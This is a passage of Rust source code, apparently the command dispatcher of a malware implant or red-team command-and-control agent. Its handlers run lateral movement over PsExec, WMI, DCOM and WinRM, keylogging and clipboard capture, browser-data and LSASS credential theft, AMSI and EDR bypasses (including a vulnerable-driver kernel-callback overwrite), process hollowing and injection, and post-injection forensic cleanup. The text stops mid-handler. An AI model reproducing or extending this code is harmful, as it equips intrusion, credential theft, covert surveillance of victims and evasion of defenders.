        Command::GetSystem => Err("token manipulation requires Windows".to_string()),

        // ── Lateral Movement (Windows only) ───────────────────────────
        #[cfg(windows)]
        Command::PsExec {
            ref target_host,
            ref command,
            ref username,
            ref password,
        } => {
            let user = username.as_deref();
            let pass = password.as_deref();
            super::lateral_movement::psexec_exec(target_host, command, user, pass)
                .map_err(|e| e.to_string())
        }
        #[cfg(not(windows))]
        Command::PsExec { .. } => Err("lateral movement requires Windows".to_string()),

        #[cfg(windows)]
        Command::WmiExec {
            ref target_host,
            ref command,
            ref username,
            ref password,
        } => {
            let user = username.as_deref();
            let pass = password.as_deref();
            super::lateral_movement::wmi_exec(target_host, command, user, pass)
                .map_err(|e| e.to_string())
        }
        #[cfg(not(windows))]
        Command::WmiExec { .. } => Err("lateral movement requires Windows".to_string()),

        #[cfg(windows)]
        Command::DcomExec {
            ref target_host,
            ref command,
            ref username,
            ref password,
        } => {
            let user = username.as_deref();
            let pass = password.as_deref();
            super::lateral_movement::dcom_exec(target_host, command, user, pass)
                .map_err(|e| e.to_string())
        }
        #[cfg(not(windows))]
        Command::DcomExec { .. } => Err("lateral movement requires Windows".to_string()),

        #[cfg(windows)]
        Command::WinRmExec {
            ref target_host,
            ref command,
            ref username,
            ref password,
        } => {
            let user = username.as_deref();
            let pass = password.as_deref();
            super::lateral_movement::winrm_exec(target_host, command, user, pass)
                .await
                .map_err(|e| e.to_string())
        }
        #[cfg(not(windows))]
        Command::WinRmExec { .. } => Err("lateral movement requires Windows".to_string()),

        // ── P2P mesh management ────────────────────────────────────────
        Command::LinkAgents {
            ref target_addr,
            ref transport,
            ..
        } => {
            let mesh_arc = p2p_mesh.clone();
            let mut mesh_guard = mesh_arc.lock().await;
            match mesh_guard
                .connect_to_parent(target_addr, transport, out_tx.clone(), p2p_mesh.clone())
                .await
            {
                Ok(link_id) => Ok(format!(
                    "LinkAgents: linked to {} via {}, link_id={:#010X}",
                    target_addr, transport, link_id
                )),
                Err(e) => Err(format!("LinkAgents failed: {e}")),
            }
        }
        Command::UnlinkAgent { ref agent_id } => {
            let mesh_arc = p2p_mesh.clone();
            let mut mesh_guard = mesh_arc.lock().await;
            match mesh_guard.disconnect_peer(agent_id).await {
                Ok(_) => Ok(format!("Peer '{agent_id}' unlinked")),
                Err(e) => Err(format!("UnlinkAgent failed: {e}")),
            }
        }
        Command::ListTopology => {
            let mesh_arc = p2p_mesh.clone();
            let mesh_guard = mesh_arc.lock().await;
            let topology = mesh_guard.get_topology();
            serde_json::to_string(&topology)
                .map_err(|e| format!("ListTopology serialization failed: {e}"))
        }

        // ── Agent-side P2P link commands ───────────────────────────────
        Command::LinkTo {
            ref parent_addr,
            ref transport,
        } => {
            let mesh_arc = p2p_mesh.clone();
            let mut mesh_guard = mesh_arc.lock().await;
            match mesh_guard
                .connect_to_parent(parent_addr, transport, out_tx.clone(), p2p_mesh.clone())
                .await
            {
                Ok(link_id) => Ok(format!(
                    "connected to parent at {} via {}, link_id={:#010X}",
                    parent_addr, transport, link_id
                )),
                Err(e) => Err(format!("LinkTo failed: {e}")),
            }
        }
        Command::Unlink { ref link_id } => {
            let mut mesh_guard = p2p_mesh.lock().await;
            match mesh_guard.disconnect(*link_id).await {
                0 => Err("no links to disconnect".to_string()),
                n => Ok(format!("disconnected {n} link(s)")),
            }
        }
        Command::ListLinks => {
            let mesh_guard = p2p_mesh.lock().await;
            let links = mesh_guard.list_links();
            Ok(serde_json::to_string(&links).unwrap_or_else(|_| "[]".to_string()))
        }

        // ── Mesh routing commands ──────────────────────────────────────
        Command::MeshConnect {
            ref target_agent_id,
            ref transport,
            ref target_addr,
        } => {
            let mesh_arc = p2p_mesh.clone();
            let mut mesh_guard = mesh_arc.lock().await;
            match mesh_guard
                .connect_to_parent(target_addr, transport, out_tx.clone(), p2p_mesh.clone())
                .await
            {
                Ok(link_id) => {
                    // Record the peer agent_id on the new link.
                    if let Some(link) = mesh_guard.links.get_mut(&link_id) {
                        link.peer_agent_id = target_agent_id.clone();
                    }
                    Ok(format!(
                        "mesh connect to {} at {} via {}, link_id={:#010X}",
                        target_agent_id, target_addr, transport, link_id
                    ))
                }
                Err(e) => Err(format!("MeshConnect failed: {e}")),
            }
        }
        Command::MeshDisconnect {
            ref target_agent_id,
        } => {
            let mut mesh_guard = p2p_mesh.lock().await;
            let link_id = mesh_guard.link_id_by_peer(target_agent_id);
            match link_id {
                Some(id) => match mesh_guard.disconnect(Some(id)).await {
                    0 => Err("no links to disconnect".to_string()),
                    n => Ok(format!(
                        "mesh disconnected {} ({n} link(s))",
                        target_agent_id
                    )),
                },
                None => Err(format!("no link to agent '{}'", target_agent_id)),
            }
        }
        Command::MeshKillSwitch => {
            let mut mesh_guard = p2p_mesh.lock().await;
            mesh_guard.activate_kill_switch();
            Ok("mesh kill switch activated: all links terminated".to_string())
        }
        Command::MeshQuarantine {
            ref target_agent_id,
            reason,
        } => {
            let mut mesh_guard = p2p_mesh.lock().await;
            match mesh_guard.quarantine_peer(target_agent_id, reason) {
                Ok(()) => Ok(format!(
                    "agent '{}' quarantined (reason={})",
                    target_agent_id, reason
                )),
                Err(e) => Err(format!("MeshQuarantine failed: {e}")),
            }
        }
        Command::MeshClearQuarantine {
            ref target_agent_id,
        } => {
            let mut mesh_guard = p2p_mesh.lock().await;
            match mesh_guard.clear_quarantine(target_agent_id) {
                Ok(()) => Ok(format!(
                    "quarantine cleared for agent '{}'",
                    target_agent_id
                )),
                Err(e) => Err(format!("MeshClearQuarantine failed: {e}")),
            }
        }
        Command::MeshSetCompartment { ref compartment } => {
            let mut mesh_guard = p2p_mesh.lock().await;
            mesh_guard.set_compartment(compartment.clone());
            Ok(format!("mesh compartment set to '{}'", compartment))
        }

        // ── In-process .NET assembly execution (Windows only) ───────────
        #[cfg(windows)]
        Command::ExecuteAssembly {
            ref data,
            ref args,
            timeout_secs,
        } => match unsafe { super::assembly_loader::execute(data, args, timeout_secs) } {
            Ok(result) => {
                let output_len = result.output.len();
                result_data = Some(result.output.into_bytes());
                let hr_display = if result.hresult as u32 == 0 {
                    "S_OK".to_string()
                } else {
                    format!("{:#010X}", result.hresult as u32)
                };
                Ok(format!(
                    "assembly executed ({} bytes output, HRESULT={})",
                    output_len, hr_display
                ))
            }
            Err(e) => Err(format!("execute-assembly failed: {e}")),
        },
        #[cfg(not(windows))]
        Command::ExecuteAssembly { .. } => {
            Err("execute-assembly requires Windows (.NET CLR hosting)".to_string())
        }

        // ── BOF / COFF loader (Windows only) ────────────────────────────
        #[cfg(windows)]
        Command::ExecuteBOF {
            ref data,
            ref args,
            timeout_secs,
        } => match unsafe { super::coff_loader::execute_bof(data, args, timeout_secs) } {
            Ok(result) => {
                let output_len = result.output.len();
                result_data = Some(result.output.into_bytes());
                Ok(format!("BOF executed ({} bytes output)", output_len))
            }
            Err(e) => Err(format!("execute-bof failed: {e}")),
        },
        #[cfg(not(windows))]
        Command::ExecuteBOF { .. } => {
            Err("execute-bof requires Windows (COFF object files)".to_string())
        }

        // ── Interactive shell sessions ─────────────────────────────────
        Command::CreateShell { ref shell_path } => {
            match crate::interactive_shell::create_shell(shell_path.as_deref(), out_tx) {
                Ok(info) => Ok(serde_json::to_string(&info).unwrap_or_default()),
                Err(e) => Err(format!("create-shell failed: {e}")),
            }
        }
        Command::ShellInput {
            session_id,
            ref data,
        } => match crate::interactive_shell::send_input(session_id, data) {
            Ok(()) => Ok(format!("input sent to session {session_id}")),
            Err(e) => Err(format!("shell-input failed: {e}")),
        },
        Command::ShellClose { session_id } => {
            match crate::interactive_shell::close_shell(session_id) {
                Ok(msg) => Ok(msg),
                Err(e) => Err(format!("shell-close failed: {e}")),
            }
        }
        Command::ShellList => match crate::interactive_shell::list_shells() {
            Ok(list) => Ok(serde_json::to_string(&list).unwrap_or_default()),
            Err(e) => Err(format!("shell-list failed: {e}")),
        },
        Command::ShellResize {
            session_id,
            cols,
            rows,
        } => match crate::interactive_shell::resize_shell(session_id, cols, rows) {
            Ok(msg) => Ok(msg),
            Err(e) => Err(format!("shell-resize failed: {e}")),
        },

        // ── Surveillance commands ─────────────────────────────────────
        #[cfg(feature = "surveillance")]
        Command::Screenshot { monitor } => match crate::surveillance::capture_screenshot(monitor) {
            Ok(png_bytes) => {
                result_data = Some(png_bytes);
                Ok("screenshot captured".to_string())
            }
            Err(e) => Err(format!("screenshot failed: {e}")),
        },
        #[cfg(not(feature = "surveillance"))]
        Command::Screenshot { .. } => Err("surveillance feature not enabled".to_string()),

        #[cfg(feature = "surveillance")]
        Command::KeyloggerStart => {
            let key_bytes = crypto.key_bytes();
            match crate::surveillance::start_keylogger(key_bytes) {
                Ok(()) => Ok("keylogger started".to_string()),
                Err(e) => Err(format!("keylogger start failed: {e}")),
            }
        }
        #[cfg(not(feature = "surveillance"))]
        Command::KeyloggerStart => Err("surveillance feature not enabled".to_string()),

        #[cfg(feature = "surveillance")]
        Command::KeyloggerDump { clear } => {
            let key_bytes = crypto.key_bytes();
            match crate::surveillance::dump_keylogger(key_bytes, clear) {
                Ok(encrypted) => {
                    result_data = Some(encrypted);
                    Ok("keylogger buffer dumped".to_string())
                }
                Err(e) => Err(format!("keylogger dump failed: {e}")),
            }
        }
        #[cfg(not(feature = "surveillance"))]
        Command::KeyloggerDump { .. } => Err("surveillance feature not enabled".to_string()),

        #[cfg(feature = "surveillance")]
        Command::KeyloggerStop => match crate::surveillance::stop_keylogger() {
            Ok(()) => Ok("keylogger stopped".to_string()),
            Err(e) => Err(format!("keylogger stop failed: {e}")),
        },
        #[cfg(not(feature = "surveillance"))]
        Command::KeyloggerStop => Err("surveillance feature not enabled".to_string()),

        #[cfg(feature = "surveillance")]
        Command::ClipboardMonitorStart { interval_ms } => {
            let key_bytes = crypto.key_bytes();
            match crate::surveillance::start_clipboard_monitor(key_bytes, interval_ms) {
                Ok(()) => Ok("clipboard monitor started".to_string()),
                Err(e) => Err(format!("clipboard monitor start failed: {e}")),
            }
        }
        #[cfg(not(feature = "surveillance"))]
        Command::ClipboardMonitorStart { .. } => {
            Err("surveillance feature not enabled".to_string())
        }

        #[cfg(feature = "surveillance")]
        Command::ClipboardMonitorDump { clear } => {
            let key_bytes = crypto.key_bytes();
            match crate::surveillance::dump_clipboard(key_bytes, clear) {
                Ok(encrypted) => {
                    result_data = Some(encrypted);
                    Ok("clipboard buffer dumped".to_string())
                }
                Err(e) => Err(format!("clipboard dump failed: {e}")),
            }
        }
        #[cfg(not(feature = "surveillance"))]
        Command::ClipboardMonitorDump { .. } => Err("surveillance feature not enabled".to_string()),

        #[cfg(feature = "surveillance")]
        Command::ClipboardMonitorStop => match crate::surveillance::stop_clipboard_monitor() {
            Ok(()) => Ok("clipboard monitor stopped".to_string()),
            Err(e) => Err(format!("clipboard monitor stop failed: {e}")),
        },
        #[cfg(not(feature = "surveillance"))]
        Command::ClipboardMonitorStop => Err("surveillance feature not enabled".to_string()),

        #[cfg(feature = "surveillance")]
        Command::ClipboardGet => match crate::surveillance::get_clipboard() {
            Ok(text) => Ok(text),
            Err(e) => Err(format!("clipboard get failed: {e}")),
        },
        #[cfg(not(feature = "surveillance"))]
        Command::ClipboardGet => Err("surveillance feature not enabled".to_string()),

        // ── Browser data recovery ─────────────────────────────────────
        #[cfg(all(windows, feature = "browser-data"))]
        Command::BrowserData {
            ref browser,
            ref data_type,
        } => {
            // Set C4 timeout from config before calling browser_data.
            {
                let cfg = config.lock().await;
                crate::browser_data::set_c4_timeout(cfg.browser_c4_timeout_secs);
            }
            match crate::browser_data::collect_browser_data(browser.clone(), data_type.clone()) {
                Ok(json) => {
                    result_data = Some(json.into_bytes());
                    Ok("browser data collected".to_string())
                }
                Err(e) => Err(format!("browser-data failed: {e}")),
            }
        }
        #[cfg(not(all(windows, feature = "browser-data")))]
        Command::BrowserData { .. } => {
            Err("browser-data feature not enabled (Windows only)".to_string())
        }

        // ── LSASS credential harvesting (Windows only) ──────────────────
        #[cfg(windows)]
        Command::HarvestLSASS => match crate::lsass_harvest::harvest_lsass() {
            Ok(json) => {
                result_data = Some(json.into_bytes());
                Ok("lsass harvest completed".to_string())
            }
            Err(e) => Err(format!("lsass harvest failed: {e}")),
        },
        #[cfg(not(windows))]
        Command::HarvestLSASS => Err("LSASS harvesting requires Windows".to_string()),

        // ── LSA Whisperer — SSP interface credential extraction ────────
        #[cfg(all(windows, feature = "lsa-whisperer"))]
        Command::HarvestLSA { ref method } => {
            let timeout = config.lock().await.lsa_whisperer.timeout_secs;
            match crate::lsa_whisperer::harvest_lsa(&method, timeout) {
                Ok(json) => {
                    result_data = Some(json.into_bytes());
                    Ok("lsa whisperer harvest completed".to_string())
                }
                Err(e) => Err(format!("lsa whisperer failed: {e}")),
            }
        }
        #[cfg(not(all(windows, feature = "lsa-whisperer")))]
        Command::HarvestLSA { .. } => {
            Err("LSA Whisperer requires Windows + lsa-whisperer feature".to_string())
        }

        #[cfg(all(windows, feature = "lsa-whisperer"))]
        Command::LSAWhispererStatus => match crate::lsa_whisperer::whisperer_status() {
            Ok(json) => {
                result_data = Some(json.into_bytes());
                Ok("lsa whisperer status".to_string())
            }
            Err(e) => Err(format!("lsa whisperer status failed: {e}")),
        },
        #[cfg(not(all(windows, feature = "lsa-whisperer")))]
        Command::LSAWhispererStatus => {
            Err("LSA Whisperer requires Windows + lsa-whisperer feature".to_string())
        }

        #[cfg(all(windows, feature = "lsa-whisperer"))]
        Command::LSAWhispererStop => match crate::lsa_whisperer::whisperer_stop() {
            Ok(msg) => Ok(msg),
            Err(e) => Err(format!("lsa whisperer stop failed: {e}")),
        },
        #[cfg(not(all(windows, feature = "lsa-whisperer")))]
        Command::LSAWhispererStop => {
            Err("LSA Whisperer requires Windows + lsa-whisperer feature".to_string())
        }

        // ── NTDLL unhooking (Windows only) ──────────────────────────────
        #[cfg(windows)]
        Command::UnhookNtdll => match crate::ntdll_unhook::unhook_ntdll() {
            Ok(result) => {
                let json = serde_json::to_string(&result).unwrap_or_default();
                result_data = Some(json.into_bytes());
                Ok(format!(
                    "ntdll unhooked via {} ({} stubs re-resolved)",
                    result.method, result.stubs_re_resolved,
                ))
            }
            Err(e) => Err(format!("ntdll unhook failed: {e}")),
        },
        #[cfg(not(windows))]
        Command::UnhookNtdll => Err("NTDLL unhooking requires Windows".to_string()),

        // ── AMSI bypass mode selection ─────────────────────────────────
        #[cfg(windows)]
        Command::AmsiBypassMode { ref mode } => {
            use common::AmsiBypassMode as Mode;

            // First disable any currently-active write-raid.
            #[cfg(feature = "write-raid-amsi")]
            {
                let _ = crate::amsi_defense::disable_write_raid();
            }

            match mode {
                Mode::WriteRaid => {
                    #[cfg(feature = "write-raid-amsi")]
                    {
                        match crate::amsi_defense::enable_write_raid() {
                            Ok(()) => Ok("AMSI write-raid bypass enabled".to_string()),
                            Err(e) => Err(format!("write-raid enable failed: {e}")),
                        }
                    }
                    #[cfg(not(feature = "write-raid-amsi"))]
                    {
                        Err(
                            "write-raid AMSI bypass not compiled (missing write-raid-amsi feature)"
                                .to_string(),
                        )
                    }
                }
                Mode::Hwbp => {
                    #[cfg(feature = "hwbp-amsi")]
                    {
                        crate::amsi_defense::orchestrate_layers();
                        Ok("AMSI HWBP bypass applied".to_string())
                    }
                    #[cfg(not(feature = "hwbp-amsi"))]
                    {
                        Err("HWBP AMSI bypass not compiled (missing hwbp-amsi feature)".to_string())
                    }
                }
                Mode::MemoryPatch => {
                    crate::amsi_defense::orchestrate_layers();
                    Ok("AMSI memory-patch bypass applied".to_string())
                }
                Mode::Auto => {
                    // Prefer write-raid > hwbp > memory-patch.
                    #[cfg(feature = "write-raid-amsi")]
                    {
                        match crate::amsi_defense::enable_write_raid() {
                            Ok(()) => {
                                Ok("AMSI write-raid bypass enabled (auto-selected)".to_string())
                            }
                            Err(_) => {
                                tracing::warn!("auto: write-raid failed, falling back to memory-patch");
                                crate::amsi_defense::orchestrate_layers();
                                Ok("AMSI memory-patch bypass applied (write-raid fallback)"
                                    .to_string())
                            }
                        }
                    }
                    #[cfg(not(feature = "write-raid-amsi"))]
                    {
                        #[cfg(feature = "hwbp-amsi")]
                        {
                            crate::amsi_defense::orchestrate_layers();
                            Ok("AMSI HWBP bypass applied (auto-selected)".to_string())
                        }
                        #[cfg(not(feature = "hwbp-amsi"))]
                        {
                            crate::amsi_defense::orchestrate_layers();
                            Ok("AMSI memory-patch bypass applied (auto-selected)".to_string())
                        }
                    }
                }
            }
        }

        #[cfg(not(windows))]
        Command::AmsiBypassMode { .. } => Err("AMSI bypass requires Windows".to_string()),

        // ── Evanesco continuous memory hiding ────────────────────────────
        // Return status of the Evanesco page-tracker subsystem.
        #[cfg(all(windows, feature = "evanesco"))]
        Command::EvanescoStatus => Ok(crate::page_tracker::status_json()),
        #[cfg(not(all(windows, feature = "evanesco")))]
        Command::EvanescoStatus => Err("evanesco feature not enabled".to_string()),

        // Dynamically adjust the Evanesco idle threshold.
        #[cfg(all(windows, feature = "evanesco"))]
        Command::EvanescoSetThreshold { idle_ms } => {
            crate::page_tracker::set_idle_threshold(idle_ms);
            Ok(format!("Evanesco idle threshold set to {}ms", idle_ms))
        }
        #[cfg(not(all(windows, feature = "evanesco")))]
        Command::EvanescoSetThreshold { .. } => Err("evanesco feature not enabled".to_string()),

        // ── Kernel callback overwrite (BYOVD, Windows only) ───────────

        // Discover and report all registered EDR kernel callbacks.
        #[cfg(all(windows, feature = "kernel-callback"))]
        Command::KernelCallbackScan => {
            let key_bytes = crypto.key_bytes();
            match crate::kernel_callback::scan(&key_bytes) {
                Ok(json) => Ok(json),
                Err(e) => Err(format!("kernel callback scan failed: {e}")),
            }
        }
        #[cfg(not(all(windows, feature = "kernel-callback")))]
        Command::KernelCallbackScan => Err("kernel-callback feature not enabled".to_string()),

        // Deploy driver + overwrite EDR callbacks with ret.
        #[cfg(all(windows, feature = "kernel-callback"))]
        Command::KernelCallbackNuke { ref drivers } => {
            let key_bytes = crypto.key_bytes();
            match crate::kernel_callback::nuke(drivers, &key_bytes) {
                Ok(json) => Ok(json),
                Err(e) => Err(format!("kernel callback nuke failed: {e}")),
            }
        }
        #[cfg(not(all(windows, feature = "kernel-callback")))]
        Command::KernelCallbackNuke { .. } => {
            Err("kernel-callback feature not enabled".to_string())
        }

        // Restore original callback pointers from saved backup.
        #[cfg(all(windows, feature = "kernel-callback"))]
        Command::KernelCallbackRestore => {
            let key_bytes = crypto.key_bytes();
            match crate::kernel_callback::restore(&key_bytes) {
                Ok(json) => Ok(json),
                Err(e) => Err(format!("kernel callback restore failed: {e}")),
            }
        }
        #[cfg(not(all(windows, feature = "kernel-callback")))]
        Command::KernelCallbackRestore => Err("kernel-callback feature not enabled".to_string()),

        // ── EDR bypass transformation engine ─────────────────────────────
        // Scan .text for known EDR byte signatures.
        #[cfg(feature = "evasion-transform")]
        Command::EvasionTransformScan => match crate::edr_bypass_transform::scan_for_signatures() {
            Ok(hits) => match serde_json::to_string_pretty(&hits) {
                Ok(json) => Ok(json),
                Err(e) => Err(format!("serialization failed: {e}")),
            },
            Err(e) => Err(format!("evasion transform scan failed: {e}")),
        },
        #[cfg(not(feature = "evasion-transform"))]
        Command::EvasionTransformScan => Err("evasion-transform feature not enabled".to_string()),

        // Run one scan-and-transform cycle.
        #[cfg(feature = "evasion-transform")]
        Command::EvasionTransformRun => {
            let cfg = config.lock().await.clone();
            let max_transforms = cfg.evasion_transform.max_transforms_per_cycle;
            let entropy_threshold = cfg.evasion_transform.entropy_threshold;
            match crate::edr_bypass_transform::run_edr_bypass_transform(
                max_transforms,
                entropy_threshold,
            ) {
                Ok(result) => match serde_json::to_string_pretty(&result) {
                    Ok(json) => Ok(json),
                    Err(e) => Err(format!("serialization failed: {e}")),
                },
                Err(e) => Err(format!("evasion transform run failed: {e}")),
            }
        }
        #[cfg(not(feature = "evasion-transform"))]
        Command::EvasionTransformRun => Err("evasion-transform feature not enabled".to_string()),

        // Query EDR bypass transform status (last scan hits, skipped, total transforms, timestamp).
        #[cfg(feature = "evasion-transform")]
        Command::EdrBypassStatus => Ok(crate::edr_bypass_transform::status()),
        #[cfg(not(feature = "evasion-transform"))]
        Command::EdrBypassStatus => Err("evasion-transform feature not enabled".to_string()),

        // NTFS transaction-based process hollowing with ETW blinding.
        #[cfg(all(windows, feature = "transacted-hollowing"))]
        Command::TransactedHollow {
            ref target_process,
            ref payload,
            etw_blinding,
        } => {
            let rollback_timeout_ms = {
                let cfg = config.lock().await.clone();
                cfg.transacted_hollowing.rollback_timeout_ms
            };
            match unsafe {
                crate::injection_transacted::inject_transacted_hollowing(
                    payload.as_slice(),
                    Some(target_process.as_str()),
                    etw_blinding,
                    rollback_timeout_ms,
                )
            } {
                Ok(handle) => {
                    // Post-injection hook: auto-clean prefetch evidence
                    // for the target process.  Best-effort, non-blocking.
                    #[cfg(all(windows, feature = "forensic-cleanup"))]
                    crate::forensic_cleanup::prefetch::auto_clean_after_injection(target_process);
                    match serde_json::to_string_pretty(&serde_json::json!({
                        "pid": handle.target_pid,
                        "base_addr": format!("{:#x}", handle.injected_base_addr),
                        "technique": "TransactedHollowing",
                        "payload_size": handle.payload_size,
                    })) {
                        Ok(json) => Ok(json),
                        Err(e) => Err(format!("serialization failed: {e}")),
                    }
                }
                Err(e) => Err(format!("transacted hollowing failed: {e}")),
            }
        }
        #[cfg(all(not(windows), feature = "transacted-hollowing"))]
        Command::TransactedHollow { .. } => {
            Err("TransactedHollow is only available on Windows".to_string())
        }
        #[cfg(not(feature = "transacted-hollowing"))]
        Command::TransactedHollow { .. } => {
            Err("transacted-hollowing feature not enabled".to_string())
        }

        // ── Process Doppelganging injection ──────────────────────────────
        // NTFS transaction-based injection that creates a section from a
        // transacted file, rolls back the transaction (no disk artifacts),
        // then maps the section into a suspended process and executes.
        #[cfg(all(windows, feature = "transacted-hollowing"))]
        Command::ProcessDoppelganging {
            ref target_process,
            ref payload,
        } => {
            match unsafe {
                crate::injection_doppelganging::doppelganging_inject(
                    payload.as_slice(),
                    target_process.as_deref(),
                )
            } {
                Ok(result) => {
                    // Post-injection hook: auto-clean prefetch evidence.
                    #[cfg(all(windows, feature = "forensic-cleanup"))]
                    if let Some(ref name) = target_process {
                        crate::forensic_cleanup::prefetch::auto_clean_after_injection(name);
                    }
                    let pid = result.pid;
                    match serde_json::to_string_pretty(&serde_json::json!({
                        "pid": pid,
                        "technique": "ProcessDoppelganging",
                        "payload_size": payload.len(),
                    })) {
                        Ok(json) => Ok(json),
                        Err(e) => Err(format!("serialization failed: {e}")),
                    }
                }
                Err(e) => Err(format!("process doppelganging failed: {e}")),
            }
        }
        #[cfg(all(not(windows), feature = "transacted-hollowing"))]
        Command::ProcessDoppelganging { .. } => {
            Err("ProcessDoppelganging is only available on Windows".to_string())
        }
        #[cfg(not(feature = "transacted-hollowing"))]
        Command::ProcessDoppelganging { .. } => {
            Err("transacted-hollowing feature not enabled".to_string())
        }

        // ── Delayed module-stomp injection ───────────────────────────────
        // Loads a sacrificial DLL into the target process, waits for a
        // randomized delay (8–15s default) to let EDR initial-scan
        // heuristics pass, then overwrites the DLL's .text section with
        // the payload.  Returns immediately after Phase 1 (DLL load);
        // Phase 2 (stomp + execute) runs in a background thread.
        #[cfg(all(windows, feature = "delayed-stomp"))]
        Command::DelayedStomp {
            target_pid,
            ref payload,
            delay_secs,
        } => {
            let cfg = config.lock().await.clone();
            let d = &cfg.delayed_stomp;
            if !d.enabled {
                Err("delayed-stomp is disabled in config".to_string())
            } else {
                let (min_delay, max_delay) = if let Some(secs) = delay_secs {
                    (secs, secs)
                } else {
                    (d.min_delay_secs, d.max_delay_secs)
                };

                match crate::injection_delayed_stomp::inject_delayed_stomp_async(
                    target_pid,
                    payload.clone(),
                    min_delay,
                    max_delay,
                ) {
                    Ok(json) => {
                        // Post-injection hook: auto-clean prefetch evidence
                        // for the target process.  Best-effort, non-blocking.
                        #[cfg(all(windows, feature = "forensic-cleanup"))]
                        crate::forensic_cleanup::prefetch::auto_clean_after_injection(&format!(
                            "pid:{}",
                            target_pid
                        ));
                        Ok(json)
                    }
                    Err(e) => Err(format!("delayed stomp failed: {e}")),
                }
            }
        }
        #[cfg(all(not(windows), feature = "delayed-stomp"))]
        Command::DelayedStomp { .. } => {
            Err("DelayedStomp is only available on Windows".to_string())
        }
        #[cfg(not(feature = "delayed-stomp"))]
        Command::DelayedStomp { .. } => Err("delayed-stomp feature not enabled".to_string()),

        // ── DLL side-load injection with export forwarding ──────────────
        // Decrypts the payload, opens the target process, resolves the
        // forward target DLL via PEB walk, patches export table entries,
        // and executes via NtCreateThreadEx.  Produces a side-loaded DLL
        // with a legitimate export table in memory.
        #[cfg(windows)]
        Command::InjectSideLoad {
            pid,
            ref payload,
            ref export_config,
        } => {
            use crate::injection::dll_sideload::DllSideLoadInjector;
            let injector = DllSideLoadInjector;
            match injector.inject_with_export_forwarding(pid, payload, export_config) {
                Ok(()) => {
                    match serde_json::to_string_pretty(&serde_json::json!({
                        "pid": pid,
                        "technique": "InjectSideLoad",
                        "forward_target": export_config.forward_target,
                        "named_exports": export_config.named_exports.len(),
                        "ordinal_exports": export_config.ordinal_exports.len(),
                        "payload_size": payload.len(),
                    })) {
                        Ok(json) => Ok(json),
                        Err(e) => Err(format!("serialization failed: {e}")),
                    }
                }
                Err(e) => Err(format!("inject side-load failed: {e}")),
            }
        }
        #[cfg(not(windows))]
        Command::InjectSideLoad { .. } => {
            Err("InjectSideLoad is only available on Windows".to_string())
        }

        // ── Unified injection engine ───────────────────────────────────
        // Dispatches through the injection_engine module which provides
        // automatic technique selection, EDR reconnaissance, ETW evasion,
        // and fallback chains across all 12 technique variants.
        #[cfg(windows)]
        Command::UnifiedInject {
            ref target_process,
            ref payload,
            ref technique,
            evade,
        } => {
            let parsed_technique = match technique.as_deref() {
                None | Some("auto") => Ok(None),
                Some(name) => crate::injection_engine::parse_technique(name)
                    .map(Some)
                    .map_err(|e| format!("invalid technique {:?}: {e}", technique)),
            };

            match parsed_technique {
                Err(e) => Err(e),
                Ok(parsed_technique) => {
                    let config = crate::injection_engine::InjectionConfig {
                        technique: parsed_technique,
                        target_process: target_process.clone(),
                        payload: payload.clone(),
                        prefer_same_arch: true,
                        evade_etw: evade,
                        timeout_ms: 30_000,
                    };

                    let result = if evade {
                        crate::injection_engine::evasiveness_inject(config)
                    } else {
                        crate::injection_engine::inject(config)
                    };

                    match result {
                        Ok(handle) => {
                            // Post-injection hook: auto-clean prefetch evidence.
                            #[cfg(feature = "forensic-cleanup")]
                            crate::forensic_cleanup::prefetch::auto_clean_after_injection(
                                target_process.as_str(),
                            );
                            match serde_json::to_string_pretty(&serde_json::json!({
                                "pid": handle.target_pid,
                                "base_addr": format!("{:#x}", handle.injected_base_addr),
                                "technique": format!("{:?}", handle.technique_used),
                                "payload_size": handle.payload_size,
                                "sleep_enrolled": handle.sleep_enrolled,
                            })) {
                                Ok(json) => Ok(json),
                                Err(e) => Err(format!("serialization failed: {e}")),
                            }
                        }
                        Err(e) => Err(format!("unified inject failed: {:?}", e)),
                    }
                }
            }
        }
        #[cfg(not(windows))]
        Command::UnifiedInject { .. } => {
            Err("UnifiedInject is only available on Windows".to_string())
        }

        // ── Sandbox scoring pipeline ────────────────────────────────────
        // Run a comprehensive sandbox/VM detection sweep and return the
        // full indicator breakdown (category, detail, weight, source)
        // together with the total score and the threshold used.
        Command::SandboxCheck => {
            let indicators = crate::env_check::collect_indicators();
            let (is_sandbox, threshold, _) = crate::env_check::evaluate_sandbox_score(&indicators);
            let total_weight: u32 = indicators.iter().map(|i| i.weight).sum();

            let result = serde_json::json!({
                "is_sandbox": is_sandbox,
                "total_weight": total_weight,
                "threshold": threshold,
                "indicator_count": indicators.len(),
                "indicators": indicators,
            });
            Ok(
                serde_json::to_string(&result)
                    .unwrap_or_else(|e| format!("{{\"error\": \"{e}\"}}")),
            )
        }

        // ── Syscall emulation toggle ────────────────────────────────────
        // Toggle user-mode NT kernel interface emulation at runtime.
        // When enabled, the agent routes configured Nt* calls through
        // kernel32/advapi32 equivalents instead of ntdll syscall stubs.
        #[cfg(all(windows, feature = "syscall-emulation"))]
        Command::SyscallEmulationToggle { enabled } => {
            crate::syscall_emulation::set_emulation_enabled(enabled);
            let status = crate::syscall_emulation::status_json();
            Ok(status)
        }
        #[cfg(not(all(windows, feature = "syscall-emulation")))]
        Command::SyscallEmulationToggle { .. } => {
            Err("syscall-emulation feature not enabled".to_string())
        }

        // ── CET / Shadow Stack status ────────────────────────────────────
        // Query the current CET (Control-flow Enforcement Technology) /
        // shadow-stack status.  Returns a JSON object describing whether
        // CET is present, enabled, and which bypass strategy is active.
        #[cfg(all(windows, feature = "cet-bypass", target_arch = "x86_64"))]
        Command::CetStatus => {
            let status = crate::cet_bypass::status_json();
            Ok(status)
        }
        #[cfg(not(all(windows, feature = "cet-bypass", target_arch = "x86_64")))]
        Command::CetStatus => Err("cet-bypass feature not enabled".to_string()),

        // ── Token-only impersonation (Windows only) ─────────────────────────
        // Create a named pipe, wait for a client, and extract the
        // impersonation token via NtImpersonateThread or SetThreadToken
        // (avoids ImpersonateNamedPipeClient on the main thread).
        #[cfg(all(windows, feature = "token-impersonation"))]
        Command::ImpersonatePipe { ref pipe_name } => {
            crate::token_impersonation::impersonate_pipe(pipe_name).map_err(|e| e.to_string())
        }
        #[cfg(not(all(windows, feature = "token-impersonation")))]
        Command::ImpersonatePipe { .. } => {
            Err("token-impersonation feature not enabled".to_string())
        }

        // Revert the current thread's impersonation token.
        #[cfg(all(windows, feature = "token-impersonation"))]
        Command::RevertToken => {
            crate::token_impersonation::revert_token().map_err(|e| e.to_string())
        }
        #[cfg(not(all(windows, feature = "token-impersonation")))]
